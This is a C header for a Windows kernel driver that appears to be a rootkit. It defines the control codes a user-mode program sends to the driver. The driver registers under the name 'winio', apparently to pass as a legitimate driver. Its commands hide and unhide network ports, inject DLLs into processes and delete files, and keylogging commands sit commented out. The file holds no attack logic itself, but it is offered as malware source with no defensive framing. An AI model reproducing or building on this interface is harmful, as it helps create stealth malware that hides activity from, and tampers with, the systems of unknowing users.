#ifndef _HOOKKEY_H
#define _HOOKKEY_H 1


// for IoCareateDevice()
#define HKLZT_DEVICE_CREATE_NAME L"\\Device\\winio"
// for IoCreateSymbolicLink()
#define HKLZT_DEVICE_LINK_NAME L"\\DosDevices\\winio"
// for user mode's CreateFile()
#define HKLZT_DEVICE_OPEN_NAME "\\\\.\\winio"

// Use these to command the driver!
#define HKLZT_COMMAND_INJECTION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED,FILE_ANY_ACCESS)

#define IOCTL_HOOKKEY_START CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800+1, METHOD_BUFFERED,FILE_ANY_ACCESS)
#define IOCTL_HOOKKEY_STOP  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800+2, METHOD_BUFFERED,FILE_ANY_ACCESS)



//#define GHOST_STATUS_COMMAND CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED,FILE_ANY_ACCESS)

// definitions for dwCommand
#define SUB_COMMAND_HIDE_PORT		1
#define SUB_COMMAND_UNHIDE_PORT		2
#define SUB_COMMAND_INJECT_DLL		3
#define SUB_COMMAND_DELETE_FILE		4
// #define SUB_COMMAND_KEYLOG_START	5
// #define SUB_COMMAND_KEYLOG_STOP		6


typedef struct
{
	ULONG	dwData;
	CHAR*	szData;
	ULONG	dwCommand;
} HKLZT_IOCTLDATA;


// definitions from ntddk.h
#ifndef CTL_CODE
#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \
    ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \
)
#endif

#ifndef FILE_DEVICE_UNKNOWN
#define FILE_DEVICE_UNKNOWN 0x00000022
#endif

#ifndef METHOD_BUFFERED
#define METHOD_BUFFERED 0
#endif

#ifndef FILE_ANY_ACCESS
#define FILE_ANY_ACCESS 0
#endif

#endif